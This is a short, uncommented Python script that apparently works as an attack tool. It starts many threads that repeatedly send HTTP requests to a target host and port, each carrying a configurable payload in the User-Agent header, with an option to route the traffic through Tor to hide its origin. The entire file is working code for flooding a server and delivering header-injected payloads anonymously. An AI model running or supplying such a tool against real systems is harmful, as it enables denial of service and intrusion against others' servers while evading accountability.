import sys
import os
import requests
import threading
from time import sleep 

TARGET_URL = os.getenv('TARGET_URL')
TARGET_PORT = os.getenv('TARGET_PORT')
NUM_THREADS = os.getenv('NUM_THREADS')
NUM_INTERATIONS = os.getenv('NUM_ITERATIONS')
SLEEP_TIMER = os.getenv('SLEEP_TIMER')
USER_AGENT_PAYLOAD = os.getenv('USER_AGENT_PAYLOAD')

sesh = requests.session()
if os.getenv('TOR') == 'TRUE':
    sesh.proxies = {'http':  'socks5://127.0.0.1:9050',
                    'https': 'socks5://127.0.0.1:9050'}

def main(argv):
    try:
        for i in range(0,int(NUM_THREADS)):
            thr = threading.Thread(target=thread_launch, name=None, args=(), kwargs={})
            thr.daemon = True
            print("thread " + str(i) + " started")
            thr.start()
        while 1:
            pass
    except KeyboardInterrupt:
        sys.exit(1)
            
def thread_launch():
    url = "http://" + TARGET_URL + ":" + TARGET_PORT
    try:
        count = 0
        headers = {'User-Agent': USER_AGENT_PAYLOAD}
        while int(NUM_INTERATIONS) > count:
            sesh.get(url, headers=headers)
            sleep(int(SLEEP_TIMER))
            count = count + 1
        print("completed thread")
    except KeyboardInterrupt:
        pass
 
if __name__ == '__main__':
    main(sys.argv)
